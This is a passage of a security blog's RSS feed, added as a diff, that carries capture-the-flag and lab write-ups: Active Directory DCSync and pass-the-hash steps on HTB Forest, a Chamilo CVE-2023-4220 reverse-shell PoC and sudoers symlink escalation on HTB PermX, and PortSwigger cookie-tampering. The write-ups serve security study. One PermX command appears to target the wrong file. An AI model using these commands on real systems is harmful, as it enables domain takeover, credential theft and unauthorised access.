+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+# Collecting data
+bloodhoud-python -u svc-alfresco -p &amp;lt;PASSWORD&amp;gt; -ns 10.129.30.97 -d htb.local -c all
+# Zipping the json output files
+zip -r data.zip *.json
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;Now that we have our zip file ready, we can start bloodhound and upload the file. After going through the results, we notice that &lt;code&gt;svc-alfresco&lt;/code&gt;, through nested group memberships, is in the &lt;code&gt;Account Operators&lt;/code&gt; group which has &lt;code&gt;GenericAll&lt;/code&gt; privilege on the &lt;code&gt;Exchange Windows Permissions&lt;/code&gt; group which then have the &lt;code&gt;WriteDacl&lt;/code&gt; privilege over the domain object.&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/forest/bloodhound.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Path for privilege escalation&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;With this information, we can do the following:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Create a new domain user.&lt;/li&gt;
+&lt;li&gt;Add that user to the &lt;code&gt;Exchange Windows Permissions&lt;/code&gt; group by abusing our &lt;code&gt;GenericAll&lt;/code&gt; privilege.&lt;/li&gt;
+&lt;li&gt;As the new user, add &lt;code&gt;DCSync&lt;/code&gt; privileges to our self by abusing the &lt;code&gt;WriteDacl&lt;/code&gt; privilege.&lt;/li&gt;
+&lt;li&gt;Dump all the hashes&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;165824379&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;165824379&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;powershell&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Getting DCSync privilege&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-powershell&#34; &gt;&lt;code&gt;
+# Creating a new domain user (as svc-alfresco)
+net user hackerr password123! /add /domain
+
+# Add &amp;#39;hackerr&amp;#39; to the Exchange Windows Permissions group
+net group &amp;#34;Exchange Windows Permissions&amp;#34; hackerr /add
+
+# Add DCSync privileges with
+$pass = ConvertTo-SecureString &amp;#39;password123!&amp;#39; -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential(&amp;#39;htb.local\hackerr&amp;#39;, $pass)
+Add-ObjectACL -PrincipalIdentity hackerr -Credential $cred -Rights DCSync
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;Now &lt;code&gt;hackerr&lt;/code&gt; should have DCSync rights. We can verify by using using impacket&amp;rsquo;s secretsdump:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;931752846&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;931752846&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;DCSync using impacket-secretsdump&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+impacket-secretsdump htb.local/hackerr:&amp;#39;password123!&amp;#39;@10.129.30.97 -just-dc -outputfile dcsync.out
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/forest/dcsync.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;DCSync&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;We can use the Administrator&amp;rsquo;s NThash to login via &lt;code&gt;winrm&lt;/code&gt;:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;172684935&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;172684935&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Login via winrm as Administrator&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+evil-winrm -i 10.129.30.97 -u Administrator -H &amp;#39;32693b11e6aa90eb43d32c72a07ceea6&amp;#39;
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;We can then retrive the root flag.&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/forest/root_flag.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Root flag obtained !&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+</content>
+    </item>
+    
+    <item>
+      <title>HTB - Permx</title>
+      <link>//localhost:1313/posts/htb-permx/</link>
+      <pubDate>Sat, 16 Nov 2024 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/posts/htb-permx/</guid>
+      <description>&lt;p&gt;PermX is a &amp;lsquo;Easy&amp;rsquo; rated machine where we get the foothold by exploiting, after some enumeration, a public CVE allowing us to upload arbitrary files to the server. After, that we find some database credentials in a configuration file. This password is re-used by a user on the box. Upon logging in as that user, we notice that they can run a bash script as root, allowing us to privesc to root.&lt;/p&gt;</description>
+      <content>&lt;p&gt;PermX is a &amp;lsquo;Easy&amp;rsquo; rated machine where we get the foothold by exploiting, after some enumeration, a public CVE allowing us to upload arbitrary files to the server. After, that we find some database credentials in a configuration file. This password is re-used by a user on the box. Upon logging in as that user, we notice that they can run a bash script as root, allowing us to privesc to root.&lt;/p&gt;
+&lt;h2 id=&#34;nmap-results&#34;&gt;Nmap Results&lt;/h2&gt;
+&lt;hr&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT   STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;80/tcp open  http    Apache httpd 2.4.52
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.52 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Did not follow redirect to http://permx.htb
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We see that we have 2 ports open:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;22 running ssh&lt;/li&gt;
+&lt;li&gt;80 running an Apache server redirecting to &lt;code&gt;http://permx.htb&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Let&amp;rsquo;s add it to our host file.&lt;/p&gt;
+&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+&lt;hr&gt;
+&lt;p&gt;Navigating to &lt;code&gt;http://permx.htb&lt;/code&gt;:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/permx/main_web_page.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Home Page&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;After going through the different pages of site, we can notice that there nothing interesting here as there are only static pages and the form on the contact page doesn&amp;rsquo;t send any data.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s see if the server has other vhosts&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;673589214&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;673589214&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Vhost enumeration using ffuf&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+ffuf -u http://FUZZ.permx.htb -w ~/tools/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+
+        /&amp;#39;___\  /&amp;#39;___\           /&amp;#39;___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://FUZZ.permx.htb
+ :: Wordlist         : FUZZ: /home/squ4r00t/tools/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 1242ms]
+:: Progress: [114441/114441] :: Job [1/1] :: 10 req/sec :: Duration: [0:10:07] :: Errors: 114440 ::
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;We got &lt;code&gt;lms&lt;/code&gt; as a vhost. Let&amp;rsquo;s add it to our hosts file.&lt;/p&gt;
+&lt;p&gt;Navigating to &lt;code&gt;lms.permx.htb&lt;/code&gt;, we see a web page powered by Chamilo&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/permx/lms_page.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;lms.permx.htb powered by Chamilo&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;After some research, we see that it is vulnerable to &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2023-4220&#34;&gt;CVE-2023-4220&lt;/a&gt; which is an arbitrary file upload allowing any unauthenticated user to achieve RCE by uploading a PHP webshell to the site. This can be exploited with &lt;a href=&#34;https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc&#34;&gt;this POC&lt;/a&gt;.&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;725391648&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;725391648&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Running exploit POC&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+# Installation / Setup
+git clone https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc.git
+cd chamilo-lms-unauthenticated-big-upload-rce-poc/
+pip install -r requirements.txt
+
+# Exploitation (setup netcat listener before)
+python3 main.py -u http://lms.permx.htb -a revshell
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;After running the script, we receive a shell on our netcat listener:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/permx/foothold_shell.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Reverse shell&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h2&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;www-data---mtz&#34;&gt;www-data -&amp;gt; mtz&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;Looking around the different files on the server, we notice some interesting ones in &lt;code&gt;/var/www/chamilo/app/config&lt;/code&gt;, espacially &lt;code&gt;configuration.php&lt;/code&gt; containing some database credentials:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/permx/db_creds.png&#34;   /&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Under the &lt;code&gt;/home&lt;/code&gt; directory we can find another user &lt;code&gt;mtz&lt;/code&gt;. Let&amp;rsquo;s try the password we found with this user:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh mtz@permx.htb
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We successfully logged in and can now retrieve the user flag:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/permx/user_flag.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;User flag obtained !&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h3 id=&#34;mtz---root&#34;&gt;mtz -&amp;gt; root&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;Enumerating our sudo privileges as &lt;code&gt;mtz&lt;/code&gt;, we can see that we can run &lt;code&gt;/opt/acl.sh&lt;/code&gt; as root:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/permx/sudo_privs.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;mtz&#39;s sudo privileges&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Let&amp;rsquo;s see the content of the script:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;857216943&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;857216943&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;/opt/acl.sh&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+#!/bin/bash
+
+if [ &amp;#34;$#&amp;#34; -ne 3 ]; then
+    /usr/bin/echo &amp;#34;Usage: $0 user perm file&amp;#34;
+    exit 1
+fi
+
+user=&amp;#34;$1&amp;#34;
+perm=&amp;#34;$2&amp;#34;
+target=&amp;#34;$3&amp;#34;
+
+if [[ &amp;#34;$target&amp;#34; != /home/mtz/* || &amp;#34;$target&amp;#34; == *..* ]]; then
+    /usr/bin/echo &amp;#34;Access denied.&amp;#34;
+    exit 1
+fi
+
+# Check if the path is a file
+if [ ! -f &amp;#34;$target&amp;#34; ]; then
+    /usr/bin/echo &amp;#34;Target must be a file.&amp;#34;
+    exit 1
+fi
+
+/usr/bin/sudo /usr/bin/setfacl -m u:&amp;#34;$user&amp;#34;:&amp;#34;$perm&amp;#34; &amp;#34;$target&amp;#34;
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;This script takes 3 arguments:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;A user&lt;/li&gt;
+&lt;li&gt;Permissions to set&lt;/li&gt;
+&lt;li&gt;And a target file&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;But the catch is that we can only set permissions of files inside &lt;code&gt;/home/mtz&lt;/code&gt; and we cannot use path traversal. We can still bypass these restrictions by making use of &lt;a href=&#34;https://en.wikipedia.org/wiki/Symbolic_link&#34;&gt;symbolic links&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;We will first create a symbolic link to the file we want to change the permissions of. In this case, we can target the sudoers file.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ln -s /etc/sudoers /home/mtz/sudoers
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now let&amp;rsquo;s run the script as root and change the permissions on &lt;code&gt;/home/mtz/sudoers&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo /opt/acl.sh mtz rw /home/mtz/sudoers
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We are now able to edit the sudoers file. From here we can easily escalate to root, an easy way to do it is:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;mtz ALL=(ALL:ALL) NOPASSWD: ALL&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /home/mtz/root
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo su
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And then retrieve the root flag:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/permx/root_flag.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Root flag obtained !&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+</content>
+    </item>
+    
+    <item>
+      <title>Exploiting path mapping for web cache deception</title>
+      <link>//localhost:1313/posts/portswigger-exploiting-path-mapping-for-web-cache-deception/</link>
+      <pubDate>Mon, 11 Nov 2024 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/posts/portswigger-exploiting-path-mapping-for-web-cache-deception/</guid>
+      <description>&lt;h2 id=&#34;lab-info&#34;&gt;Lab Info&lt;/h2&gt;
+&lt;hr&gt;
+&lt;p&gt;| &lt;strong&gt;Lab name&lt;/strong&gt; | Exploiting path mapping for web cache deception |
+| &lt;strong&gt;Level&lt;/strong&gt; | Apprentice |
+| &lt;strong&gt;Link&lt;/strong&gt; | &lt;a href=&#34;https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-mapping&#34;&gt;https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-mapping&lt;/a&gt; |&lt;/p&gt;
+&lt;p&gt;To solve the lab, find the API key for the user carlos. You can log in to your own account using the following credentials: &lt;code&gt;wiener:peter&lt;/code&gt;.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Required Knowlegde&lt;/strong&gt;&lt;br&gt;
+To solve this lab, you&amp;rsquo;ll need to know:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;How regex endpoints map URL paths to resources.&lt;/li&gt;
+&lt;li&gt;How to detect and exploit discrepancies in the way the cache and origin server map URL paths.
+{: .prompt-warning}
+These points are covered here -&amp;gt; &lt;a href=&#34;https://portswigger.net/web-security/web-cache-deception&#34;&gt;Web cache deception&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;solving-the-lab&#34;&gt;Solving the lab&lt;/h2&gt;
+&lt;hr&gt;</description>
+      <content>&lt;h2 id=&#34;lab-info&#34;&gt;Lab Info&lt;/h2&gt;
+&lt;hr&gt;
+&lt;p&gt;| &lt;strong&gt;Lab name&lt;/strong&gt; | Exploiting path mapping for web cache deception |
+| &lt;strong&gt;Level&lt;/strong&gt; | Apprentice |
+| &lt;strong&gt;Link&lt;/strong&gt; | &lt;a href=&#34;https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-mapping&#34;&gt;https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-mapping&lt;/a&gt; |&lt;/p&gt;
+&lt;p&gt;To solve the lab, find the API key for the user carlos. You can log in to your own account using the following credentials: &lt;code&gt;wiener:peter&lt;/code&gt;.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Required Knowlegde&lt;/strong&gt;&lt;br&gt;
+To solve this lab, you&amp;rsquo;ll need to know:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;How regex endpoints map URL paths to resources.&lt;/li&gt;
+&lt;li&gt;How to detect and exploit discrepancies in the way the cache and origin server map URL paths.
+{: .prompt-warning}
+These points are covered here -&amp;gt; &lt;a href=&#34;https://portswigger.net/web-security/web-cache-deception&#34;&gt;Web cache deception&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;solving-the-lab&#34;&gt;Solving the lab&lt;/h2&gt;
+&lt;hr&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Modifying Serialized Objects</title>
+      <link>//localhost:1313/posts/portswigger-modifying-serial-obj/</link>
+      <pubDate>Mon, 11 Nov 2024 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/posts/portswigger-modifying-serial-obj/</guid>
+      <description>&lt;p&gt;This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete the user &lt;code&gt;carlos&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;You can log in to your own account using the following credentials: &lt;code&gt;wiener:peter&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;solving-the-lab&#34;&gt;Solving the lab&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;To solve the lab, let&amp;rsquo;s first login as &lt;code&gt;wiener&lt;/code&gt; using the provided credentials.&lt;/p&gt;</description>
+      <content>&lt;p&gt;This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete the user &lt;code&gt;carlos&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;You can log in to your own account using the following credentials: &lt;code&gt;wiener:peter&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;solving-the-lab&#34;&gt;Solving the lab&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;To solve the lab, let&amp;rsquo;s first login as &lt;code&gt;wiener&lt;/code&gt; using the provided credentials.&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/portswigger/insecure_deserial/modifying_serial_obj/login.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Login page&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Once logged in, we notice that we get a base64 encoded cookie:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/portswigger/insecure_deserial/modifying_serial_obj/cookie.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Base64 encode cookie&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;After decoding it, we get the following PHP serialized object:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;O:4:&amp;#34;User&amp;#34;:2:{s:8:&amp;#34;username&amp;#34;;s:6:&amp;#34;wiener&amp;#34;;s:5:&amp;#34;admin&amp;#34;;b:0;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This is an object of the class &lt;code&gt;User&lt;/code&gt; containing 2 attributes:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;username&lt;/code&gt;: string set to the value &amp;ldquo;wiener&amp;rdquo;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;admin&lt;/code&gt;: boolean set to False (0)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Let&amp;rsquo;s try to set the &lt;code&gt;admin&lt;/code&gt; attribute to &lt;code&gt;True&lt;/code&gt;, re-encode the object and update the value of our cookie:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;O:4:&amp;#34;User&amp;#34;:2:{s:8:&amp;#34;username&amp;#34;;s:6:&amp;#34;wiener&amp;#34;;s:5:&amp;#34;admin&amp;#34;;b:1;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/portswigger/insecure_deserial/modifying_serial_obj/new-cookie.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Updating cookie&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;If we refresh the page, we can see that we now have access to the admin panel where we can delete the user &lt;code&gt;carlos&lt;/code&gt; and solve the lab:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/portswigger/insecure_deserial/modifying_serial_obj/delete_carlos.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Deleting user carlos&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/portswigger/insecure_deserial/modifying_serial_obj/congrats.png&#34;   /&gt;
+    
